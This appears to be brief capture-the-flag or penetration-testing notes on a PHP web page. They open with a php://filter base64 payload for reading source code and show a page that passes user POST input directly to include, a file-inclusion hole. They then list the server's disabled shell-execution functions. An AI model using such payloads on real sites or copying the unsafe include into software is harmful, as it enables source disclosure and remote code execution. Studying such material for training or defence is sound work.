php://filter/convert.base64-encode/resource=custom_image.php
```php
<?php require "./includes/header.inc.php" ?>

<style>
    .form-group{
        display: flex;
        justify-content: center;
        align-items: center;
        width: 100%;
    }

    .form-dalem{
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        margin: 50px 0px;
    }
    .form-dalem > *{
        margin: 10px 0px;
    }
</style>


<div class="form-group">
    <form action="custom_image.php" method="POST" class="form-dalem">

    
    <h1>Input your Custom Image</h1>
    <br>
    <input type="text" class="form-control" aria-label="Username" aria-describedby="basic-addon1" name="custom_image" placeholder="https://media.tenor.com/WjIF7fZJCVUAAAAd/begitu-sulit.gif">
    <button class="btn btn-outline-success my-2 my-sm-0" type="submit">Search</button>
    <br>
    
    <?php
        if(isset($_POST['custom_image'])){
            include $_POST['custom_image'];
        } else {
            ?>
            <img src="https://media.tenor.com/WjIF7fZJCVUAAAAd/begitu-sulit.gif" alt="">
            <?php
        }
    ?>

    </form>
</div>
















<?php require "./includes/footer.inc.php" ?>
```

disable function

```
passthru,shell_exec,system,proc_open,popen,curl_multi_exec,parse_ini_file,show_source
```